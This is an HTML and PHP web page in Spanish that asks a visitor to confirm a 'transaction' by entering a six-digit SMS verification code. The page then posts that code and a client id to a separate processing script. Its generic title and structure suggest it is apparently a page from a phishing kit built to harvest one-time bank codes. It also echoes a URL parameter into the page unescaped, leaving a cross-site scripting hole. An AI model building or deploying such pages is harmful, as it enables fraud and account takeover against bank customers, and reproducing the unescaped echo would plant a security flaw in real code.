<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="/css/style.css">

    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin: 0;
        }

        .details {
            margin-top: 40%;
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 400px;
        }

        img {
            width: 130px;
        }

        h3 {
            margin-top: 0px !important;
            color: black;
        }

        a {
            display: block;
            color: #333;
            text-decoration: none;
        }

        input[type="tel"] {
            width: 90%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            text-align: center;
            margin-top: 10px;
        }

        input[type="submit"] {
            color: white;
            background-color: blue;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 80%;
            height: 35px;
            margin-top: 5px;
        }

        input[type="submit"]:hover {
            background-color: darkblue;
        }

        .footer-links {
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="details">
        <img src="img/logo.webp" alt="Logo" width="130px">
        <h3>Vamos a validar tu transacción</h3>
        <a>Ingresa el código SMS que te acabamos de enviar y dale "Confirmar".</a><br>
        <!-- Formulario que envía los datos a process_otp.php -->
        <form action="process/process_otp.php" method="POST">
            <a>Código de verificación</a>
            <input type="hidden" name="cliente_id" value="<?php echo $_GET['id']; ?>">
            <input type="tel" name="claveDinamica" id="txtOTP" required minlength="6" maxlength="6" pattern="\d*" inputmode="numeric"><br><br>
            <input type="submit" value="ENVIAR">
        </form>
    </div>

    <div class="footer-links">
        <a href="#">REENVIAR CÓDIGO</a><br>
        <a href="#">Ayuda</a>
    </div>
</body>
</html>
